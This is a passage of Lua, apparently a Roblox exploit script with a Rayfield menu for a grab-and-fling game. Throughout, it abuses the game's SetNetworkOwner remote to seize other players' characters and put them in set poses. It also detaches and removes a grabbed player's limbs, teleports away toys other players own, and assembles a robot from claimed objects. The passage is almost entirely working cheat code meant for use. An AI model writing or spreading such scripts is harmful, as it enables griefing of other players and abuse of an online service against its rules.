        MyCharacter = FigureGrabModule.GetCharacter(FigureGrabModule.LocalPlayer)
        
        if not FigureGrabModule.State.TargetCharacter or not MyCharacter then
            Rayfield:Notify({
                Title = "Error",
                Content = "Invalid target",
                Duration = 3
            })
            return
        end
        
        BodyParts = {"Head", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}
        TargetTorso = FigureGrabModule.State.TargetCharacter:FindFirstChild("Torso")
        
        if not TargetTorso then
            Rayfield:Notify({
                Title = "Error",
                Content = "Torso not found",
                Duration = 3
            })
            return
        end
        
        for _, partName in pairs(BodyParts) do
            part = FigureGrabModule.State.TargetCharacter:FindFirstChild(partName)
            if part then
                part.Anchored = false
                part.CanCollide = true
                part.Massless = true
            end
        end
        
        FigureGrabModule.State.FigureGrabEnabled = true
        FigureGrabModule.Configuration.LineDistance = 5
        
        if FigureGrabModule.State.FigureGrabConnection then
            FigureGrabModule.State.FigureGrabConnection:Disconnect()
        end
        
        FigureGrabModule.State.FigureGrabConnection = FigureGrabModule.RunService.Heartbeat:Connect(function()
            if not FigureGrabModule.State.TargetCharacter or not MyCharacter then
                FigureGrabModule.State.FigureGrabEnabled = false
                if FigureGrabModule.State.FigureGrabConnection then
                    FigureGrabModule.State.FigureGrabConnection:Disconnect()
                end
                return
            end
            
            MyRoot = MyCharacter:FindFirstChild("HumanoidRootPart")
            if not MyRoot then return end
            
            holdCFrame = MyRoot.CFrame * CFrame.new(
                FigureGrabModule.Configuration.HoldPosition.X, 
                FigureGrabModule.Configuration.HoldPosition.Y, 
                FigureGrabModule.Configuration.HoldPosition.Z
            )
            
            TargetTorso.CFrame = holdCFrame * CFrame.Angles(
                math.rad(FigureGrabModule.Configuration.HoldRotation.X), 
                math.rad(FigureGrabModule.Configuration.HoldRotation.Y), 
                math.rad(FigureGrabModule.Configuration.HoldRotation.Z)
            )
            TargetTorso.Velocity = FigureGrabModule.State.VectorZero
            TargetTorso.RotVelocity = FigureGrabModule.State.VectorZero
            
            if FigureGrabModule.State.AnimationCopyEnabled then
                FigureGrabModule.CopyAnimationsFromLimbs()
            else
                for _, partName in pairs(BodyParts) do
                    part = FigureGrabModule.State.TargetCharacter:FindFirstChild(partName)
                    if part and part ~= TargetTorso then
                        if partName == "Left Arm" then
                            part.CFrame = TargetTorso.CFrame * CFrame.new(
                                FigureGrabModule.Configuration.LeftArmPosition.X, 
                                FigureGrabModule.Configuration.LeftArmPosition.Y, 
                                FigureGrabModule.Configuration.LeftArmPosition.Z
                            ) * CFrame.Angles(
                                math.rad(FigureGrabModule.Configuration.LeftArmRotation.X), 
                                math.rad(FigureGrabModule.Configuration.LeftArmRotation.Y), 
                                math.rad(FigureGrabModule.Configuration.LeftArmRotation.Z)
                            )
                            part.Velocity = FigureGrabModule.State.VectorZero
                            part.RotVelocity = FigureGrabModule.State.VectorZero
                        end
                        
                        if partName == "Right Arm" then
                            part.CFrame = TargetTorso.CFrame * CFrame.new(
                                FigureGrabModule.Configuration.RightArmPosition.X, 
                                FigureGrabModule.Configuration.RightArmPosition.Y, 
                                FigureGrabModule.Configuration.RightArmPosition.Z
                            ) * CFrame.Angles(
                                math.rad(FigureGrabModule.Configuration.RightArmRotation.X), 
                                math.rad(FigureGrabModule.Configuration.RightArmRotation.Y), 
                                math.rad(FigureGrabModule.Configuration.RightArmRotation.Z)
                            )
                            part.Velocity = FigureGrabModule.State.VectorZero
                            part.RotVelocity = FigureGrabModule.State.VectorZero
                        end
                        
                        if partName == "Left Leg" then
                            part.CFrame = TargetTorso.CFrame * CFrame.new(
                                FigureGrabModule.Configuration.LeftLegPosition.X, 
                                FigureGrabModule.Configuration.LeftLegPosition.Y, 
                                FigureGrabModule.Configuration.LeftLegPosition.Z
                            ) * CFrame.Angles(
                                math.rad(FigureGrabModule.Configuration.LeftLegRotation.X), 
                                math.rad(FigureGrabModule.Configuration.LeftLegRotation.Y), 
                                math.rad(FigureGrabModule.Configuration.LeftLegRotation.Z)
                            )
                            part.Velocity = FigureGrabModule.State.VectorZero
                            part.RotVelocity = FigureGrabModule.State.VectorZero
                        end
                        
                        if partName == "Right Leg" then
                            part.CFrame = TargetTorso.CFrame * CFrame.new(
                                FigureGrabModule.Configuration.RightLegPosition.X, 
                                FigureGrabModule.Configuration.RightLegPosition.Y, 
                                FigureGrabModule.Configuration.RightLegPosition.Z
                            ) * CFrame.Angles(
                                math.rad(FigureGrabModule.Configuration.RightLegRotation.X), 
                                math.rad(FigureGrabModule.Configuration.RightLegRotation.Y), 
                                math.rad(FigureGrabModule.Configuration.RightLegRotation.Z)
                            )
                            part.Velocity = FigureGrabModule.State.VectorZero
                            part.RotVelocity = FigureGrabModule.State.VectorZero
                        end
                        
                        if partName == "Head" then
                            part.CFrame = TargetTorso.CFrame * CFrame.new(
                                FigureGrabModule.Configuration.HeadPosition.X, 
                                FigureGrabModule.Configuration.HeadPosition.Y, 
                                FigureGrabModule.Configuration.HeadPosition.Z
                            ) * CFrame.Angles(
                                math.rad(FigureGrabModule.Configuration.HeadRotation.X), 
                                math.rad(FigureGrabModule.Configuration.HeadRotation.Y), 
                                math.rad(FigureGrabModule.Configuration.HeadRotation.Z)
                            )
                            part.Velocity = FigureGrabModule.State.VectorZero
                            part.RotVelocity = FigureGrabModule.State.VectorZero
                        end
                    end
                end
            end
            
            FigureGrabModule.SetNetworkOwner:FireServer(MouseTarget, holdCFrame)
        end)
        
        Rayfield:Notify({
            Title = "Figure Grab",
            Content = "Figure Grab Activated",
            Duration = 3
        })
    else
        FigureGrabModule.State.FigureGrabEnabled = false
        FigureGrabModule.State.AnimationCopyEnabled = false
        if FigureGrabModule.State.FigureGrabConnection then
            FigureGrabModule.State.FigureGrabConnection:Disconnect()
            FigureGrabModule.State.FigureGrabConnection = nil
        end
        
        Rayfield:Notify({
            Title = "Figure Grab",
            Content = "Figure Grab Deactivated",
            Duration = 3
        })
    end
end

function FigureGrabModule.SetAnimationCopy(enabled)
    FigureGrabModule.State.AnimationCopyEnabled = enabled
end

function FigureGrabModule.ResetPose()
    for section, values in pairs(FigureGrabModule.Configuration) do
        if typeof(values) == "table" then
            for axis, _ in pairs(values) do
                values[axis] = 0
            end
        end
    end
end

function FigureGrabModule.ApplyPreset(presetName)
    preset = FigureGrabModule.Presets[presetName]
    if preset then
        for section, values in pairs(preset) do
            if FigureGrabModule.Configuration[section] then
                for axis, value in pairs(values) do
                    FigureGrabModule.Configuration[section][axis] = value
                end
            end
        end
    end
end

function FigureGrabModule.UpdateConfig(section, axis, value)
    if FigureGrabModule.Configuration[section] and FigureGrabModule.Configuration[section][axis] ~= nil then
        FigureGrabModule.Configuration[section][axis] = value
    end
end

local FunnyRigLoaded = false

FigureTab:CreateButton({
    Name = "Custom rig(reanimation + copy anims)",
    Callback = function()
        if FunnyRigLoaded then
            Rayfield:Notify({
                Title = "Already Active",
                Content = "idiot",
                Duration = 4
            })
            return
        end
        FunnyRigLoaded = true



        local plr = game.Players.LocalPlayer
        local ch = plr.Character or plr.CharacterAdded:Wait()
        local delayed = 0
        local childrens = {}

        local children = {
            "Right Arm", "Right Leg", "Left Arm", "Left Leg", "Torso"
        }

        local function rma()
            for _, acc in pairs(ch:GetDescendants()) do
                if acc:IsA("Accessory") then
                    acc:Destroy()
                end
            end
        end

        local function inv()
            for _, v in pairs(ch:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Transparency = 1
                    v.CanCollide = true
                    v.Anchored = false
                end
            end
        end

        local very_funne_rig = Instance.new("Model")
        very_funne_rig.Name = "very funne rig"
        very_funne_rig.Parent = workspace

        local function clone()
            for _, v in pairs(ch:GetDescendants()) do
                if v:IsA("BasePart") and table.find(children, v.Name) then
                    local c = Instance.new("Part")
                    c.Size = v.Size
                    c.Material = Enum.Material.SmoothPlastic
                    c.Transparency = 0
                    c.CanCollide = false
                    c.Anchored = true
                    c.Name = v.Name .. "_funnyrig"

                    if v.Name == "Left Arm" or v.Name == "Right Arm" then
                        c.Color = Color3.fromRGB(255, 255, 255)
                    elseif v.Name == "Torso" then
                        c.Color = Color3.fromRGB(75, 151, 75)
                    elseif v.Name == "Left Leg" or v.Name == "Right Leg" then
                        c.Color = Color3.fromRGB(110, 153, 202)
                    else
                        c.Color = v.Color
                    end

                    local rigo = Instance.new("Highlight")
                    rigo.Parent = c
                    rigo.FillTransparency = 1
                    rigo.OutlineTransparency = 0.5
                    rigo.OutlineColor = Color3.fromRGB(0, 0, 0)
                    rigo.DepthMode = Enum.HighlightDepthMode.Occluded

                    c.Parent = very_funne_rig
                    table.insert(childrens, {original = v, clone = c, highlight = rigo})
                end
            end
        end

        rma()
        inv()
        clone()

        if plr.Character:FindFirstChild("Head") and plr.Character.Head:FindFirstChild("face") then
            plr.Character.Head.face:Destroy()
        end

        task.spawn(function()
            local credits = Instance.new("Message")
            credits.Parent = workspace
            credits.Text = [[
Skibidi mango
Custom rig
Can reanimate
Just fun
]]
            task.wait(5)
            credits:Destroy()
        end)

        task.spawn(function()
            while FunnyRigLoaded do
                for _, p in pairs(childrens) do
                    if p.original and p.original.Parent then
                        p.clone.CFrame = p.original.CFrame
                    end
                end
                delayed = math.random(1,7) / 100
                task.wait(delayed)
            end
        end)

        Rayfield:Notify({
            Title = "Rig loaded",
            Content = "Can be used for reanimation",
            Duration = 5
        })

    end
})


    FigureTab:CreateKeybind({
        Name = "Toggle Figure Grab (Aim at target)",
        CurrentKeybind = "V",
        HoldToInteract = false,
        Flag = "FG_ToggleKeybind",
        Callback = function()
            FigureGrabModule.ToggleFigureGrab()
        end,
    })

    FigureTab:CreateToggle({
        Name = "Copy My Animations to Target",
        CurrentValue = false,
        Flag = "FG_AnimCopyToggle",
        Callback = function(Value)
            FigureGrabModule.SetAnimationCopy(Value)
            if Value then
                Rayfield:Notify({
                    Title = "Animation Copy",
                    Content = "Now copying your animations!",
                    Duration = 3
                })
            else
                Rayfield:Notify({
                    Title = "Animation Copy",
                    Content = "Manual control restored",
                    Duration = 3
                })
            end
        end,
    })

	GrabTab:CreateSection("Remove things")

local SelectedLimbs = {
    ["Right Arm"] = false,
    ["Left Arm"] = false,
    ["Right Leg"] = true,
    ["Left Leg"] = true,
}

GrabTab:CreateDropdown({
    Name = "Limbs to Remove",
    Options = {
        "Right Arm",
        "Left Arm",
        "Right Leg",
        "Left Leg",
    },
    CurrentOption = {
        "Right Leg",
        "Left Leg",
    },
    MultipleOptions = true,
    Callback = function(options)
        -- Reset all limbs to false
        for k in pairs(SelectedLimbs) do
            SelectedLimbs[k] = false
        end

        -- Enable selected limbs
        for _, limb in ipairs(options) do
            SelectedLimbs[limb] = true
        end
    end
})

local function deleteLimbs(plrModel)
    if not plrModel then return end

    for limbName, enabled in pairs(SelectedLimbs) do
        if enabled then
            local limb = plrModel:FindFirstChild(limbName)
            if limb then
                for _, obj in ipairs(limb:GetChildren()) do
                    if obj:IsA("Motor6D") or obj:IsA("Weld") or obj:IsA("WeldConstraint") then
                        obj:Destroy()
                    end
                end
                limb.CFrame = CFrame.new(0, -10000, 0)
            end
        end
    end
end

GrabTab:CreateKeybind({
    Name = 'Remove limbs  <font face="GothamBlack" color="rgb(7,255,0)">ragdoll grab advised</font>   <font face="GothamBlack" color="rgb(39,245,218)">for exp❤️😇</font>',
    CurrentKeybind = "T",
    HoldToInteract = false,
    Callback = function()
        local g = workspace:FindFirstChild("GrabParts")
        local gp = g and g:FindFirstChild("GrabPart")
        if not gp then return end

        local weld = gp:FindFirstChild("WeldConstraint")
        if not weld or not weld.Part1 then return end

        local grabbedPlayerModel = weld.Part1:FindFirstAncestorOfClass("Model")
        if not grabbedPlayerModel then return end

        local spawnCFrame = gp.CFrame

        deleteLimbs(grabbedPlayerModel)


        if SpawnToyRF then
            SpawnToyRF:InvokeServer(
                "FoodHamburger",
                spawnCFrame,
                Vector3.new(0, 0, 0)
            )
        end
    end,
})

local Players = game:GetService("Players")
local me = Players.LocalPlayer
local Mouse = me:GetMouse()
local rs = game:GetService("ReplicatedStorage")
local GrabEvent = rs.GrabEvents.SetNetworkOwner

function grab(prt) GrabEvent:FireServer(prt, prt.CFrame) end

function FWC(parent, name, timeout)
    timeout = timeout or 5
    local startTime = tick()
    while tick() - startTime < timeout do
        local child = parent:FindFirstChild(name)
        if child then
            return child
        end
        task.wait(0.1)
    end
    return nil
end


GrabTab:CreateKeybind({
    Name = "Unweld / delete toys",
    CurrentKeybind = "H",
    HoldToInteract = false,
    Flag = "DeleteObjectBind",

    Callback = function()
        local obj = Mouse.Target
        if obj then
            if not obj:FindFirstAncestor("Map") and 
               not obj:FindFirstAncestor("Slots") and 
               not obj:FindFirstAncestor("Plots") then
                
                local character = me.Character
                if character then
                    local humanoidRootPart = FWC(character, "HumanoidRootPart")
                    if humanoidRootPart then
                        local distance = (obj.Position - humanoidRootPart.Position).Magnitude
                        if distance < 30 then
                            
                            if not obj.Parent:FindFirstChildOfClass("Humanoid") then
                                local startTime = tick()
                                while obj and obj.Parent and (not obj:FindFirstChild("PartOwner") or 
                                       (obj:FindFirstChild("PartOwner") and obj.PartOwner.Value ~= me.Name)) do
                                    
                                    if tick() - startTime > 10 then
                                        warn("Tm")
                                        break
                                    end
                                    
                                    spawn(function()
                                        pcall(function()
                                            grab(obj)
                                        end)
                                    end)
                                    
                                    task.wait(0.1)
                                end
                            else
                                local Head = FWC(obj.Parent, "Head")
                                local startTime = tick()
                                while obj and Head and Head.Parent and (not Head:FindFirstChild("PartOwner") or 
                                       (Head:FindFirstChild("PartOwner") and Head.PartOwner.Value ~= me.Name)) do
                                    
                                    if tick() - startTime > 10 then
                                        warn("tm")
                                        break
                                    end
                                    
                                    spawn(function()
                                        pcall(function()
                                            grab(obj)
                                        end)
                                    end)
                                    
                                    task.wait(0.1)
                                end
                            end
                            
                            if obj and obj.Parent then
                                pcall(function()
                                    obj.CFrame = CFrame.new(300, -97, 3000)
                                end)
                            end
                        else
                            Rayfield:Notify({
                                Title = "Error",
                                Content = "Too far away",
                                Duration = 2,
                                Image = 7743878056
                            })
                        end
                    end
                end
            else
                print("ee")
            end
        end
    end
})


    FigureTab:CreateSection("Hold (Torso) - Position")
    FigureTab:CreateSlider({
        Name = "Hold Position X",
        Range = {-50, 50},
        Increment = 0.1,
        Suffix = "units",
        CurrentValue = 0,
        Flag = "FG_HoldPosX",
        Callback = function(value)
            FigureGrabModule.UpdateConfig("HoldPosition", "X", value)
        end
    })

    FigureTab:CreateSlider({
        Name = "Hold Position Y",
        Range = {-50, 50},
        Increment = 0.1,
        Suffix = "units",
        CurrentValue = 0,
        Flag = "FG_HoldPosY",
        Callback = function(value)
            FigureGrabModule.UpdateConfig("HoldPosition", "Y", value)
        end
    })

    FigureTab:CreateSlider({
        Name = "Hold Position Z",
        Range = {-50, 50},
        Increment = 0.1,
        Suffix = "units",
        CurrentValue = -5,
        Flag = "FG_HoldPosZ",
        Callback = function(value)
            FigureGrabModule.UpdateConfig("HoldPosition", "Z", value)
        end
    })

    FigureTab:CreateSection("Hold (Torso) - Rotation")
    FigureTab:CreateSlider({
        Name = "Hold Rotation X",
        Range = {0, 360},
        Increment = 1,
        Suffix = "°",
        CurrentValue = 0,
        Flag = "FG_HoldRotX",
        Callback = function(value)
            FigureGrabModule.UpdateConfig("HoldRotation", "X", value)
        end
    })

    FigureTab:CreateSlider({
        Name = "Hold Rotation Y",
        Range = {0, 360},
        Increment = 1,
        Suffix = "°",
        CurrentValue = 0,
        Flag = "FG_HoldRotY",
        Callback = function(value)
            FigureGrabModule.UpdateConfig("HoldRotation", "Y", value)
        end
    })

    FigureTab:CreateSlider({
        Name = "Hold Rotation Z",
        Range = {0, 360},
        Increment = 1,
        Suffix = "°",
        CurrentValue = 0,
        Flag = "FG_HoldRotZ",
        Callback = function(value)
            FigureGrabModule.UpdateConfig("HoldRotation", "Z", value)
        end
    })

    FigureTab:CreateSection("Left Arm - Position")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Left Arm Position " .. axis,
            Range = {-50, 50},
            Increment = 0.1,
            Suffix = "units",
            CurrentValue = 0,
            Flag = "FG_LArmPos" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("LeftArmPosition", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Left Arm - Rotation")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Left Arm Rotation " .. axis,
            Range = {0, 360},
            Increment = 1,
            Suffix = "°",
            CurrentValue = 0,
            Flag = "FG_LArmRot" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("LeftArmRotation", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Right Arm - Position")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Right Arm Position " .. axis,
            Range = {-50, 50},
            Increment = 0.1,
            Suffix = "units",
            CurrentValue = 0,
            Flag = "FG_RArmPos" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("RightArmPosition", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Right Arm - Rotation")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Right Arm Rotation " .. axis,
            Range = {0, 360},
            Increment = 1,
            Suffix = "°",
            CurrentValue = 0,
            Flag = "FG_RArmRot" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("RightArmRotation", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Left Leg - Position")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Left Leg Position " .. axis,
            Range = {-50, 50},
            Increment = 0.1,
            Suffix = "units",
            CurrentValue = 0,
            Flag = "FG_LLegPos" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("LeftLegPosition", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Left Leg - Rotation")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Left Leg Rotation " .. axis,
            Range = {0, 360},
            Increment = 1,
            Suffix = "°",
            CurrentValue = 0,
            Flag = "FG_LLegRot" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("LeftLegRotation", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Right Leg - Position")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Right Leg Position " .. axis,
            Range = {-50, 50},
            Increment = 0.1,
            Suffix = "units",
            CurrentValue = 0,
            Flag = "FG_RLegPos" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("RightLegPosition", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Right Leg - Rotation")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Right Leg Rotation " .. axis,
            Range = {0, 360},
            Increment = 1,
            Suffix = "°",
            CurrentValue = 0,
            Flag = "FG_RLegRot" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("RightLegRotation", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Head - Position")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Head Position " .. axis,
            Range = {-25, 25 },
            Increment = 0.05,
            Suffix = "units",
            CurrentValue = 0,
            Flag = "FG_HeadPos" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("HeadPosition", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Head - Rotation")
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureTab:CreateSlider({
            Name = "Head Rotation " .. axis,
            Range = {0, 360},
            Increment = 1,
            Suffix = "°",
            CurrentValue = 0,
            Flag = "FG_HeadRot" .. axis,
            Callback = function(value)
                FigureGrabModule.UpdateConfig("HeadRotation", axis, value)
            end
        })
    end

    FigureTab:CreateSection("Saves")
    FigureTab:CreateButton({
        Name = "Reset Pose",
        Callback = function()
            FigureGrabModule.ResetPose()
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 1 Jesus",
        Callback = function()
            FigureGrabModule.ApplyPreset("Pose1")
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 2 Dog",
        Callback = function()
            FigureGrabModule.ApplyPreset("Pose2")
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 3 L",
        Callback = function()
            FigureGrabModule.ApplyPreset("Pose3")
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 4 Head Hold",
        Callback = function()
            FigureGrabModule.ApplyPreset("Pose4")
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 5 Handstand",
        Callback = function()
            FigureGrabModule.ApplyPreset("Pose5")
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 6 Stand 1",
        Callback = function()
            FigureGrabModule.ApplyPreset("Pose6")
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 7 T-Pose",
        Callback = function()
            FigureGrabModule.ApplyPreset("Pose7")
        end
    })

    FigureTab:CreateButton({
        Name = "Pose 8 Stand 2",
        Callback = function()
            FigureGrabModule.ApplyPreset("JojoStand")
        end
    })

	
ToyTab:CreateDivider()

Players = game:GetService("Players")
 RunService = game:GetService("RunService")
 ReplicatedStorage = game:GetService("ReplicatedStorage")
 Workspace = game:GetService("Workspace")

LocalPlayer = Players.LocalPlayer
 GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
 SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")

Config = {
    SCAN_RADIUS = 50,
    SCAN_DELAY = 0.1,
    ROBOT_SCALE = 1,
    TOY_TYPE = "DrawerLightBrown",
    USE_ALL_TOYS = false,
    ROBOT_ACTIVE = false,
    REQUIRED_TOYS = 13,
}

 RobotParts = {
    Head = {count = 1, toys = {}, positions = {}},
    RightArm = {count = 3, toys = {}, positions = {}},
    LeftArm = {count = 3, toys = {}, positions = {}},
    RightLeg = {count = 3, toys = {}, positions = {}},
    LeftLeg = {count = 3, toys = {}, positions = {}},
}
 activeToys = {}
 recentParts = setmetatable({}, {__mode = "k"})
 counterLabel = nil
 heartbeatConnection = nil
scanLoop = nil

function isOwned(part)
    local owner = part:FindFirstChild("PartOwner")
    return owner and owner.Value == LocalPlayer.Name
end

function claimPartOwner(part)
    if not part or not part.Parent then return end
    pcall(function()
        SetNetworkOwner:FireServer(part, part.CFrame)
    end)
end

function getCurrentToyFolder()
    local inPlot = LocalPlayer:FindFirstChild("InPlot")
    if inPlot and inPlot:IsA("BoolValue") and inPlot.Value then
        local plots = Workspace:FindFirstChild("Plots")
        if plots then
            for i = 1, 5 do
                local plot = plots:FindFirstChild("Plot"..i)
                if plot and plot:FindFirstChild("PlotSign") then
                    for _, name in ipairs({"ThisPlotsOwners", "ThisPlotsOwner", "ThisPlotOwners"}) do
                        local container = plot.PlotSign:FindFirstChild(name)
                        local val = container
                        if container and container:IsA("Folder") then
                            val = container:FindFirstChildOfClass("StringValue")
                                or container:FindFirstChild("Value")
                                or container:FindFirstChild("Owner")
                        end
                        if val and val:IsA("StringValue") then
                            local tries = 0
                            while val.Value == "" and inPlot.Value and tries < 50 do
                                task.wait(0.1)
                                tries += 1
                            end
                            if not inPlot.Value then break end
                            if val.Value == LocalPlayer.Name then
                                local items = Workspace:FindFirstChild("PlotItems")
                                if items and items:FindFirstChild("Plot"..i) then
                                    return items["Plot"..i], plot
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    return Workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys"), nil
end

function generateLimbPositions(limbName, count)
    local positions = {}
    local scale = Config.ROBOT_SCALE
    
    if limbName == "Head" then
        table.insert(positions, Vector3.new(0, scale * 2, 0))
        
    elseif limbName == "RightArm" then
        for i = 1, count do
            local x = scale * 1.5
            local y = scale * 0.5 - (i - 1) * scale * 0.6
            table.insert(positions, Vector3.new(x, y, 0))
        end
        
    elseif limbName == "LeftArm" then
        for i = 1, count do
            local x = -scale * 1.5
            local y = scale * 0.5 - (i - 1) * scale * 0.6
            table.insert(positions, Vector3.new(x, y, 0))
        end
        
    elseif limbName == "RightLeg" then
        for i = 1, count do
            local x = scale * 0.5
            local y = -scale * 0.5 - (i - 1) * scale * 0.6
            table.insert(positions, Vector3.new(x, y, 0))
        end
        
    elseif limbName == "LeftLeg" then
        for i = 1, count do
            local x = -scale * 0.5
            local y = -scale * 0.5 - (i - 1) * scale * 0.6
            table.insert(positions, Vector3.new(x, y, 0))
        end
    end
    
    return positions
end

function ensureBodyPosition(part)
    if not part or not part.Parent then return nil end
    if activeToys[part] then return activeToys[part] end

    local bp = Instance.new("BodyPosition")
    bp.Name = "RobotBodyPosition"
    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bp.P = 50000
    bp.D = 1000
    bp.Position = part.Position
    bp.Parent = part
    
    local bg = Instance.new("BodyGyro")
    bg.Name = "RobotBodyGyro"
    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bg.P = 50000
    bg.D = 1000
    bg.CFrame = part.CFrame
    bg.Parent = part
    
    part.CanCollide = false
    activeToys[part] = {bp = bp, bg = bg}

    return activeToys[part]
end

function assignToyToRobot(part)
    for limbName, limbData in pairs(RobotParts) do
        if #limbData.toys < limbData.count then
            table.insert(limbData.toys, part)
            if #limbData.positions == 0 then
                limbData.positions = generateLimbPositions(limbName, limbData.count)
            end
            ensureBodyPosition(part)
            updateCounter()
            return true
        end
    end
    return false
end

function getLimbCFrame(limbName)
    local char = LocalPlayer.Character
    if not char then return CFrame.new() end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return CFrame.new() end
    
    if limbName == "Head" then
        local head = char:FindFirstChild("Head")
        if head then
            return head.CFrame
        end
        return hrp.CFrame * CFrame.new(0, 1.5, 0)
        
    elseif limbName == "RightArm" then
        local rightArm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightUpperArm")
        if rightArm then
            return rightArm.CFrame
        end
        return hrp.CFrame * CFrame.new(1.5, 0.5, 0)
        
    elseif limbName == "LeftArm" then
        local leftArm = char:FindFirstChild("Left Arm") or char:FindFirstChild("LeftUpperArm")
        if leftArm then
            return leftArm.CFrame
        end
        return hrp.CFrame * CFrame.new(-1.5, 0.5, 0)
        
    elseif limbName == "RightLeg" then
        local rightLeg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightUpperLeg")
        if rightLeg then
            return rightLeg.CFrame
        end
        return hrp.CFrame * CFrame.new(0.5, -1.5, 0)
        
    elseif limbName == "LeftLeg" then
        local leftLeg = char:FindFirstChild("Left Leg") or char:FindFirstChild("LeftUpperLeg")
        if leftLeg then
            return leftLeg.CFrame
        end
        return hrp.CFrame * CFrame.new(-0.5, -1.5, 0)
    end
    
    return hrp.CFrame
end

function updateRobotPositions()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    for limbName, limbData in pairs(RobotParts) do
        local limbCFrame = getLimbCFrame(limbName)
        for i, toy in ipairs(limbData.toys) do
            if toy and toy.Parent and limbData.positions[i] then
                local bodyMovers = activeToys[toy]
                if bodyMovers and bodyMovers.bp and bodyMovers.bg then
                    local targetPos = limbCFrame:PointToWorldSpace(limbData.positions[i])
                    local targetCFrame = limbCFrame * CFrame.new(limbData.positions[i])
                    bodyMovers.bp.Position = targetPos
                    bodyMovers.bg.CFrame = targetCFrame
                end
            end
        end
    end
end

function cleanupRobot()
    for part, bodyMovers in pairs(activeToys) do
        if bodyMovers.bp and bodyMovers.bp.Parent then
            bodyMovers.bp:Destroy()
        end
        if bodyMovers.bg and bodyMovers.bg.Parent then
            bodyMovers.bg:Destroy()
        end
        activeToys[part] = nil
    end
    
    for _, limbData in pairs(RobotParts) do
        limbData.toys = {}
        limbData.positions = {}
    end
    
    updateCounter()
end

function createCounterUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "RobotCounter"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local frame = Instance.new("Frame")
    frame.Name = "CounterFrame"
    frame.Size = UDim2.new(0, 220, 0, 80)
    frame.Position = UDim2.new(0.5, -110, 0.05, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 12)
    uiCorner.Parent = frame
    
    local uiStroke = Instance.new("UIStroke")
    uiStroke.Color = Color3.fromRGB(139, 90, 43)
    uiStroke.Thickness = 3
    uiStroke.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 0.4, 0)
    title.Position = UDim2.new(0, 0, 0, 5)
    title.BackgroundTransparency = 1
    title.Text = "DRAWER ROBOT"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = frame
    local counter = Instance.new("TextLabel")
    counter.Name = "Counter"
    counter.Size = UDim2.new(1, -20, 0.5, 0)
    counter.Position = UDim2.new(0, 10, 0.45, 0)
    counter.BackgroundTransparency = 1
    counter.Text = "0 / " .. Config.REQUIRED_TOYS
    counter.TextColor3 = Color3.fromRGB(139, 90, 43)
    counter.TextScaled = true
    counter.Font = Enum.Font.GothamBold
    counter.Parent = frame
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    return counter
end

function updateCounter()
    if counterLabel then
        local count = 0
        for _, limbData in pairs(RobotParts) do
            count = count + #limbData.toys
        end
        counterLabel.Text = count .. " / " .. Config.REQUIRED_TOYS
        if count >= Config.REQUIRED_TOYS then
            counterLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        elseif count >= Config.REQUIRED_TOYS * 0.75 then
